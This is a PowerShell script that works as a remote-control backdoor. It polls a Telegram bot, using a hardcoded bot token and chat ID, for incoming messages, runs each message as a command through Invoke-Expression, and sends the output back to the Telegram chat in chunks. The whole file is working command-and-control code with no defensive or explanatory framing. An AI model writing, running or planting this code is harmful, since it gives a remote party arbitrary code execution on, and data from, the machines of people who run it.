$Token = '7605640104:AAGYHhbE725OkE8bEbgFPSzROWp8zcDvXow'
$ChatId = '6601089119'

function Send-Message {
    param($text)
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatId
        text    = $text
    }
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body
    } catch {
        Write-Error "Failed to send message: $_"
    }
}

function Get-Updates {
    param($offset)
    $url = "https://api.telegram.org/bot$Token/getUpdates"
    if ($offset) {
        $url += "?offset=$offset"
    }
    try {
        $response = Invoke-RestMethod -Uri $url -Method Get
        return $response
    } catch {
        Write-Error "Failed to get updates: $_"
        return $null
    }
}

$lastUpdateId = 0

Send-Message "PowerShell listener started and listening for commands."

while ($true) {
    $updates = Get-Updates -offset ($lastUpdateId + 1)
    if ($null -ne $updates -and $updates.ok) {
        foreach ($update in $updates.result) {
            $updateId = $update.update_id
            if ($updateId -gt $lastUpdateId) {
                $lastUpdateId = $updateId
            }

            $messageText = $null
            $chatId = $null

            if ($update.message) {
                $messageText = $update.message.text
                $chatId = $update.message.chat.id
            } elseif ($update.callback_query) {
                $messageText = $update.callback_query.data
                $chatId = $update.callback_query.message.chat.id
            } else {
                continue
            }

            if ($messageText) {
                Write-Output "Received command: $messageText"

                try {
                    $output = Invoke-Expression -Command $messageText 2>&1
                    $outputText = $output -join "`n"
                } catch {
                    $outputText = $_.Exception.Message
                }

                $maxLength = 4000
                for ($i = 0; $i -lt $outputText.Length; $i += $maxLength) {
                    $chunk = $outputText.Substring($i, [Math]::Min($maxLength, $outputText.Length - $i))
                    Send-Message -text $chunk
                }
            }
        }
    } else {
        Write-Output "Error fetching updates or no updates."
    }
    Start-Sleep -Seconds 2
}
